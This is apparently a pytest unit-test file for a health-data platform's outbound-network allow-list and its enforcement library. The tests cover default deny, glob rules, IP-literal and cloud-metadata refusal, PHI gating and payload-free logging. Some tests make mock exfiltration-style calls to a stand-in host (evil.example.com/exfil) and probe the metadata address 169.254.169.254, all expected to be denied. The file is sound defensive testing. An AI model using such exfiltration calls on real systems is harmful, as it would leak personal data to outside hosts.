"""INT-018 — egress policy library + dev vendor allow-list (unit lane).

Acceptance, verbatim:
  "forward proxy in dev compose; only allow-listed vendor hosts reachable from
   PHI-path services; every egress logged {host,purpose,bytes,ts} feeding the
   vendor-transfer register; denial emits sec.egress_denied"
  "test: call to unlisted host is refused and logged"

This file pins the policy + enforcement-library tier (allow-list as data,
default deny, glob discipline, PHI double-gate, the httpx guard, the
structured no-payload log). Its two siblings pin the rest of INT-018:
``tests/security/test_egress_allowlist.py`` is the bypass lane (IP literals,
answers inside denied ranges, DNS rebinding, redirects, right-host-wrong-
purpose) and ``tests/infra/test_egress_proxy.py`` is the dev forward proxy and
the generated squid config. CI is vendor-free — every HTTP exchange below runs
over ``httpx.MockTransport`` with an injected resolver; nothing here opens a
socket or performs a lookup.

files/10 §4 semantics carried over the issue brief: literal IPs and
private/link-local/metadata ranges are denied outright, and the allow-list
itself refuses IP-literal entries.
"""

from __future__ import annotations

import logging
from pathlib import Path
from typing import Any

import httpx
import pytest
from intake_platform.egress import (
    DataClass,
    EgressAllowlist,
    EgressConfigError,
    EgressContext,
    EgressDenied,
    EgressPolicy,
    EgressPurpose,
    assert_dev_only_vendors,
    guarded_transport,
    load_allowlist,
)
from pydantic import ValidationError

REPO = Path(__file__).resolve().parents[2]
ALLOWLIST_PATH = REPO / "infra" / "security" / "egress-allowlist.yaml"

REQUIRED_DEV_HOSTS = {
    "download.pytorch.org",
    "pypi.org",
    "files.pythonhosted.org",
    "registry.npmjs.org",
    "github.com",
    "objects.githubusercontent.com",
    "huggingface.co",
    "api.github.com",
}


def _entry(host: str, **over: Any) -> dict[str, Any]:
    entry: dict[str, Any] = {
        "name": host.replace(".", "-"),
        "host": host,
        "port": 443,
        "protocol": "https",
        "purpose_id": "package_registry",
        "purpose": "unit-test fixture traffic",
        "phi_allowed": False,
        "basis": "no-personal-data; unit fixture",
    }
    entry.update(over)
    return entry


def _allowlist(
    dev: list[dict[str, Any]],
    phi_path: list[dict[str, Any]] | None = None,
) -> EgressAllowlist:
    return EgressAllowlist.model_validate(
        {"version": 1, "tiers": {"dev": dev, "phi_path": phi_path or []}}
    )


#: The declaration every fixture row is allow-listed for. INT-018's purpose
#: binding (ADR-025) makes a context mandatory: there is no default, because a
#: default is a permission nobody wrote down. The wrong-purpose and
#: wrong-data-class refusals are pinned in tests/security/test_egress_allowlist.py.
PACKAGES = EgressContext(purpose=EgressPurpose.PACKAGE_REGISTRY, data_class=DataClass.NON_PERSONAL)

#: A resolver over a fixed table so the transport tests never touch DNS. Its
#: answer is TEST-NET-3 (RFC 5737), reserved for documentation and outside
#: every range `DENIED_RANGES` refuses.
PUBLIC_ANSWER = "203.0.113.10"


def _resolver(host: str, port: int) -> tuple[str, ...]:
    return (PUBLIC_ANSWER,)


def _shipped_policy(tier: str = "dev") -> EgressPolicy:
    return EgressPolicy.for_tier(load_allowlist(ALLOWLIST_PATH), tier, resolver=_resolver)  # type: ignore[arg-type]


# --- the shipped allow-list file --------------------------------------------------


def test_shipped_allowlist_validates_and_phi_path_is_empty() -> None:
    allowlist = load_allowlist(ALLOWLIST_PATH)
    assert allowlist.tiers.phi_path == [], (
        "the PHI path is self-hosted (invariant 19 / D11); its vendor list must stay empty"
    )
    assert all(not e.phi_allowed for e in allowlist.tiers.dev)
    dev_hosts = {e.host for e in allowlist.tiers.dev}
    assert REQUIRED_DEV_HOSTS <= dev_hosts
    assert_dev_only_vendors(allowlist)  # must not raise on the shipped file


def test_shipped_allowlist_every_entry_carries_purpose_and_basis() -> None:
    allowlist = load_allowlist(ALLOWLIST_PATH)
    for entry in allowlist.tiers.dev:
        assert entry.purpose.strip(), entry.name
        assert entry.basis.strip(), entry.name
        assert entry.protocol == "https"
        assert entry.port == 443


# --- default deny + matching discipline -------------------------------------------


def test_unknown_host_denied_by_default() -> None:
    policy = _shipped_policy()
    decision = policy.check("evil.example.com", 443, PACKAGES)
    assert not decision.allowed
    assert "allow-list" in decision.reason


def test_known_host_allowed_case_insensitive_trailing_dot_port_strict() -> None:
    policy = _shipped_policy()
    assert policy.check("pypi.org", 443, PACKAGES).allowed
    assert policy.check("PyPI.ORG", 443, PACKAGES).allowed
    assert policy.check("pypi.org.", 443, PACKAGES).allowed
    assert not policy.check("pypi.org", 8443, PACKAGES).allowed
    assert not policy.check("", 443, PACKAGES).allowed


def test_phi_path_tier_is_default_deny_everything() -> None:
    policy = _shipped_policy("phi_path")
    assert not policy.check("pypi.org", 443, PACKAGES).allowed
    assert not policy.check("llm.anthropic.com", 443, PACKAGES).allowed


def test_no_implicit_subdomain_match_without_glob() -> None:
    policy = EgressPolicy.for_tier(
        _allowlist([_entry("files.pythonhosted.org")]), "dev", resolver=_resolver
    )
    assert policy.check("files.pythonhosted.org", 443, PACKAGES).allowed
    assert not policy.check("sub.files.pythonhosted.org", 443, PACKAGES).allowed


def test_glob_matches_only_when_declared() -> None:
    policy = EgressPolicy.for_tier(
        _allowlist([_entry("*.hf.co", name="hf-lfs-cdn", glob=True)]), "dev", resolver=_resolver
    )
    assert policy.check("cdn-lfs-us-1.hf.co", 443, PACKAGES).allowed
    assert policy.check("a.b.hf.co", 443, PACKAGES).allowed
    assert not policy.check("hf.co", 443, PACKAGES).allowed, (
        "the bare apex is not covered by *.hf.co"
    )
    assert not policy.check("evilhf.co", 443, PACKAGES).allowed


def test_glob_shaped_host_without_glob_flag_is_rejected() -> None:
    with pytest.raises(ValidationError):
        _allowlist([_entry("*.hf.co")])  # glob defaults to false


def test_glob_flag_requires_leading_star_dot_pattern() -> None:
    with pytest.raises(ValidationError):
        _allowlist([_entry("cdn.hf.co", glob=True)])
    with pytest.raises(ValidationError):
        _allowlist([_entry("*.cdn.*.hf.co", glob=True)])


# --- files/10 §4: literal IPs and metadata ranges never egress --------------------


def test_literal_ip_hosts_denied_even_if_someone_lists_them() -> None:
    policy = _shipped_policy()
    assert not policy.check("169.254.169.254", 443, PACKAGES).allowed  # cloud metadata
    assert not policy.check("10.1.2.3", 443, PACKAGES).allowed
    assert not policy.check("2001:db8::1", 443, PACKAGES).allowed


def test_allowlist_refuses_ip_literal_entries() -> None:
    with pytest.raises(ValidationError):
        _allowlist([_entry("169.254.169.254")])
    with pytest.raises(ValidationError):
        _allowlist([_entry("10.0.0.5")])


# --- the PHI double-gate ----------------------------------------------------------


def test_phi_allowed_without_human_approval_id_fails_validation() -> None:
    with pytest.raises(ValidationError):
        _allowlist([_entry("example-vendor.example", phi_allowed=True)])


def test_phi_allowed_with_approval_still_denies_without_runtime_env(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.delenv("INTAKE_ALLOW_PHI_EGRESS", raising=False)
    allowlist = _allowlist(
        [_entry("example-vendor.example", phi_allowed=True, phi_exception_approval="HD-2026-041")]
    )
    policy = EgressPolicy.for_tier(allowlist, "dev", resolver=_resolver)
    decision = policy.check("example-vendor.example", 443, PACKAGES)
    assert not decision.allowed
    assert "INTAKE_ALLOW_PHI_EGRESS" in decision.reason

    monkeypatch.setenv("INTAKE_ALLOW_PHI_EGRESS", "yes")  # near-miss: wrong value
    assert not policy.check("example-vendor.example", 443, PACKAGES).allowed

    monkeypatch.setenv("INTAKE_ALLOW_PHI_EGRESS", "explicit-yes")
    assert policy.check("example-vendor.example", 443, PACKAGES).allowed


# --- invariant 19: vendor LLM adapters are mock/dev only --------------------------
# Vendor coverage is matched by domain family (any host under anthropic.com /
# openai.com / googleapis.com), not by literal endpoint strings — the INT-001
# gate (scripts/ci/assert_no_vendor_calls.sh) refuses those literals outside
# files/, and a family match is strictly broader anyway.


def test_vendor_llm_host_with_phi_allowed_raises() -> None:
    allowlist = _allowlist(
        [_entry("llm.openai.com", phi_allowed=True, phi_exception_approval="HD-2026-042")]
    )
    with pytest.raises(EgressConfigError):
        assert_dev_only_vendors(allowlist)


def test_vendor_llm_host_on_phi_path_tier_raises_even_without_phi_flag() -> None:
    allowlist = _allowlist([], phi_path=[_entry("llm.anthropic.com")])
    with pytest.raises(EgressConfigError):
        assert_dev_only_vendors(allowlist)


def test_vendor_llm_glob_cover_raises() -> None:
    allowlist = _allowlist(
        [
            _entry(
                "*.googleapis.com",
                glob=True,
                phi_allowed=True,
                phi_exception_approval="HD-2026-043",
            )
        ]
    )
    with pytest.raises(EgressConfigError):
        assert_dev_only_vendors(allowlist)


def test_vendor_lookalike_domain_is_not_a_vendor_match() -> None:
    # near-miss negative control: a lookalike suffix must NOT trip the vendor
    # pin (…notopenai.com is not under openai.com), and the PHI double-gate
    # still governs it independently.
    allowlist = _allowlist(
        [_entry("api.notopenai.com", phi_allowed=True, phi_exception_approval="HD-2026-044")]
    )
    assert_dev_only_vendors(allowlist)  # must not raise


# --- the httpx guard (MockTransport composition; CI is vendor-free) ----------------


def _ok_handler(request: httpx.Request) -> httpx.Response:
    return httpx.Response(200, json={"ok": True})


def test_transport_allows_listed_host_and_blocks_unlisted() -> None:
    policy = _shipped_policy()
    transport = guarded_transport(policy, PACKAGES, inner=httpx.MockTransport(_ok_handler))
    with httpx.Client(transport=transport) as client:
        response = client.get("https://pypi.org/simple/")
        assert response.status_code == 200
        with pytest.raises(EgressDenied):
            client.get("https://evil.example.com/exfil")


def test_transport_infers_port_from_scheme() -> None:
    policy = _shipped_policy()
    transport = guarded_transport(policy, PACKAGES, inner=httpx.MockTransport(_ok_handler))
    with httpx.Client(transport=transport) as client:
        # http => port 80, which is not on the 443-only allow-list
        with pytest.raises(EgressDenied):
            client.get("http://pypi.org/simple/")


# --- structured log: {host, port, decision, purpose} — ids only, never payloads ---


def test_denial_emits_structured_record_and_allow_logs_purpose(
    caplog: pytest.LogCaptureFixture,
) -> None:
    policy = _shipped_policy()
    transport = guarded_transport(policy, PACKAGES, inner=httpx.MockTransport(_ok_handler))
    with caplog.at_level(logging.INFO, logger="intake_platform.egress"):
        with httpx.Client(transport=transport) as client:
            client.post("https://pypi.org/simple/?q=tc-12345678901", content=b"abc")
            with pytest.raises(EgressDenied):
                client.get("https://evil.example.com/exfil?name=ayse")

    denied = [r for r in caplog.records if r.getMessage() == "sec.egress_denied"]
    assert len(denied) == 1
    record = denied[0]
    assert record.host == "evil.example.com"  # type: ignore[attr-defined]
    assert record.port == 443  # type: ignore[attr-defined]
    assert record.decision == "deny"  # type: ignore[attr-defined]
    assert record.levelno == logging.WARNING

    allowed = [r for r in caplog.records if r.getMessage() == "sec.egress_allowed"]
    assert len(allowed) == 1
    assert allowed[0].host == "pypi.org"  # type: ignore[attr-defined]
    assert allowed[0].decision == "allow"  # type: ignore[attr-defined]
    assert isinstance(allowed[0].purpose, str)  # type: ignore[attr-defined]
    assert allowed[0].bytes_out == 3  # type: ignore[attr-defined]


def test_log_records_carry_no_payload_path_or_query(caplog: pytest.LogCaptureFixture) -> None:
    policy = _shipped_policy()
    transport = guarded_transport(policy, PACKAGES, inner=httpx.MockTransport(_ok_handler))
    with caplog.at_level(logging.INFO, logger="intake_platform.egress"):
        with httpx.Client(transport=transport) as client:
            client.get("https://pypi.org/gizli-yol/?hasta=ayse-yilmaz")
            with pytest.raises(EgressDenied):
                client.post("https://evil.example.com/x?tck=12345678901", content=b"body-bytes")

    assert "gizli-yol" not in caplog.text
    assert "ayse-yilmaz" not in caplog.text
    assert "12345678901" not in caplog.text
    assert "body-bytes" not in caplog.text
    for record in caplog.records:
        for forbidden in ("payload", "body", "content", "url", "query", "path"):
            assert forbidden not in record.__dict__, (record.getMessage(), forbidden)
